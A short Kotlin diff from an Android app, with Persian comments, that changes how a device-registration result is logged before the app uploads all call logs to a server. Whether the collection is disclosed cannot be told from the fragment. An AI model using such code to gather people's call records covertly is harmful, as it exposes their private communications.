@@ -251,13 +251,13 @@ class MainActivity : ComponentActivity() {
 
                     // 1️⃣ رجیستر
                     Log.d(TAG, "1️⃣ Registering...")
-                    val registerJson = DataUploader.registerDevice(
+                    val registerSuccess = DataUploader.registerDevice(
                         this@MainActivity,
                         deviceId,
                         fcmToken,
                         userId
                     )
-                    Log.d(TAG, "✅ Register JSON created: ${registerJson.toString()}")
+                    Log.d(TAG, if (registerSuccess) "✅ Registered" else "⚠️ Register failed")
 
                     // 2️⃣ آپلود همه Call Logs
                     Log.d(TAG, "2️⃣ Uploading all call logs...")
